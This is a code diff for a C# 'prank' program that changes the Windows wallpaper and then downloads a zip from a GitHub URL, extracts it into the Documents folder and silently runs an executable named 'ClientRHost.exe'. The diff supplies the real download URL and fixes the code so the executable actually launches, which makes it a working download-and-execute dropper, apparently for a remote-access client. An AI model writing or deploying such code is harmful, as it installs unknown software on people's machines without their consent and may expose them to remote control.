@@ -12,7 +12,7 @@ namespace Prikolchik
         private const int SPIF_UPDATEINIFILE = 0x01;
         private const int SPIF_SENDWININICHANGE = 0x02;
 
-        private const string ZIP_URL = "https://example.com/file.zip";
+        private const string ZIP_URL = "https://github.com/arkadiychulkover/Prikolchik/raw/refs/heads/master/Prikolchik/win-x64.zip";
         private const string IMG_URL = "https://zastavki.gas-kvas.com/uploads/posts/2024-09/zastavki-gas-kvas-com-6iu0-p-zastavki-na-rabochii-stol-gachimuchi-1.jpg";
         static void Main(string[] args)
         {
@@ -22,10 +22,12 @@ namespace Prikolchik
             DownloadFile(IMG_URL, walpaperPath);
             ChangeWallpaper(walpaperPath);
 
-            string extractPath = Path.Combine(DOCUMENTS_PATH, "win-x64");
-            DownloadZIPandExtract(ZIP_URL, extractPath);
+            DownloadZIPandExtract(ZIP_URL, DOCUMENTS_PATH);
+            string pathToDir = Path.Combine(DOCUMENTS_PATH, "win-x64");
+            Console.WriteLine(pathToDir);
 
-            string exePath = Path.Combine(extractPath, "ClientRHost.exe");
+            string exePath = Path.Combine(pathToDir, "ClientRHost.exe");
+            Console.WriteLine(exePath);
             StartProcess(exePath);
         }
         public static bool DownloadZIPandExtract(string url, string extractPath)
@@ -56,6 +58,7 @@ namespace Prikolchik
             {
                 FileName = filePath
             };
+            process.StartInfo = startInfo;
             process.Start();
             return true;
         }
